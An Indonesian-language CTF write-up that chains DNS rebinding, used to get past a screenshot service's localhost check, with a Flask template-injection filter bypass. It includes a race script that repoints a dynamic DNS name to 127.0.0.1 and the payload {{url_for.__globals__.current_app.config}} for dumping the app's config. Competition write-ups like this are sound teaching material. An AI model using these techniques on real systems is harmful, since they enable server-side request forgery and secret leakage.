# Bye-ending

## Ground
DIberikan sebuah web dengan sebuah text box untuk meng-input sebuah url. Analisa heuristik pada html source code web tersebut dapat disimpulkan bahwa saat sebuah url diinput, maka web tersebut akan melakukan request ke url tersebut dan melakukan screen capture. 

Dari source code yang diberikan (routes.py) di soal, secara ringkas web tersebut bekerja sebagai berikut:

 - Menerima `url` dan nilai `timeout` dari input klien
 - Memanggil fungsi `valid_target(url)`, memastikan klien tidak mengirimkan url yang mengarah pada localhost
 - Menghentikan jalannya program sementara dengan durasi sesuai nilai `timeout`
 - Melakukan request ke `url` yang diterima menggunakan Firefox
 - Menghentikan jalannya program (lagi) selama 10 detik (nilai konstan)
 - Mengambil screenshot dari `url` yang dibuka dan mengirimkannya kembali ke klien

Pada fungsi `valid_target`, bila input `url` yang diterima berupa domain name, maka program akan mencoba mendapatkan IP dibalik domain tersebut untuk memastikan bahwa domain tersebut tidak mengarah pada IP `127.0.0.1` (localhost); hal tersebut terlihat pada baris `ip = socket.gethostbyname(url)`. 

### DNS Rebinding

Jika diperhatikan, antara pemanggilan fungsi `valid_target` dengan saat Firefox melakukan request ke url yang dituju terdapat delay (`time.sleep(timeout)`), dan delay tersebut dapat ditentukan sendiri oleh klien melalui nilai `timeout` yang dikirimkan, selama masih dibawah 150 detik.

Berikut skema alurnya:
```
valid_target(url) -> sleep(timeout) -> driver.get(url)
```

Penyusunan kode seperti diatas berpotensi menimbulkan serangan DNS rebinding. 
Contohnya, saat fungsi `valid_target` menterjemahkan domain `petircysec.com` menjadi IP, IP yang didapat adalah `111.222.333.444`. Kemudian program akan terhenti sementara selama 150 detik (sebagai contoh). Pada saat itu, seseorang mengubah IP dari `petircysec.com` menjadi `127.0.0.1`. Karena TTL (time-to-live) terendah dari sebuah domain adalah 60 detik, maka setelah 60 detik, setiap perangkat yang akan mengunjungi domain `petircysec.com` harus mengulangi proses menterjemahkan domain ke IP (melalui DNS query). Artinya, setelah 150 detik program terhenti dan Firefox melakukan request ke `url` yang diberikan (dalam konteks ini, `petircysec.com`), Firefox akan mengulangi proses menterjemahkan domain ke IP, dan akan diarahkan ke IP `127.0.0.1`, bukan lagi ke `111.222.333.444`.

### Server-side Template Injection

Dari source code kedua yang diberikan (admin_routes.py), diketahui bahwa:

 - Terdapat web lain yang berjalan di localhost, berbasis Python Flask.
 - Web tersebut berpotesi memiliki kelamahan SSTI lewat fungsi `render_template_string`yang dipanggil, namun terdapat filter yang membuat kata-kata `self` dan `config` tidak dapat berada di dalam payload
 - Flag terdapat pada config aplikasi Flask yang berjalan

## Solve


### The Bye Web Catcher Webapp
Eksploitasi web ini digunakan agar penyerang dapat mengakses web selanjutnya yang hanya berjalan di localhost. 
Skema serangannya adalah:
```
buat domain abc.xyz mengarah pada IP 111.222.333.444
|
v
pada web, lakukan input:
url = abc.xyz
timeout = 150
|
v
segera ubah domain abc.xyz menjadi mengarah pada IP 127.0.0.1
```
Berikut script yang digunakan:
```Python
import requests
import subprocess
import time
from multiprocessing import Process, Pool

CMD = "noipy -u someusername -p somepassword -n zomzo.gotdns.ch --provider noip 127.0.0.1"

TARGET = "bye-ending.problem.cscctf.com"

def  doRequest():
	return requests.post(TARGET, data={
		"url": "zomzo.gotdns.ch",
		"timeout": 150
	})
	
with Pool(processes=2) as pool:
	req = pool.apply_async(doRequest, ())
	res = None
	time.sleep(10) # wait until valid_target() check has been completed
	res = subprocess.call(CMD) # change the IP into 127.0.0.1
	try:
		res = req.get(timeout=150)
	except  Exception  as e:
		pass
```


### The Localhost Webapp

Setelah mendapat akses ke web localhost, kelemahan SSTI dapat diexploitasi pada endpoint `/action/<payload>`. Berdasarkan source code, bila nilai `<payload>` adalah `config`ataupun `self`, maka nilai tersebut akan difilter dan diganti dengan kalimat `Hohoho. Happy Holiday, hekel.`

Untuk mengatasi halangan tersebut dapat menggunakan fungsi `url_for()` yang terdapat pada Flask. Atribut global yang terdapat pada fungsi tersebut dapat diakses menggunakan `__globals__`, dimana didalamnya terdapat sebuah variabel dengan nama `current_app`. Akses variabel tersebut sama artinya dengan kita mengakses aplikasi Flask yang berjalan saat itu. Selanjutnya, tinggal akses variable `config` dan mendapatkan flag yang terdapat didalamnya.

Berikut payload yang digunakan secara keseluruhan:
`/action/{{url_for.__globals__.current_app.config}}`

Payload tersebut dikirimkan ke web yang berjalan di localhost menggunakan DNS Rebinding yang telah dijabarkan sebelumnya.

## Flag
`CCC{a_journ3y_into_dnssssti}`
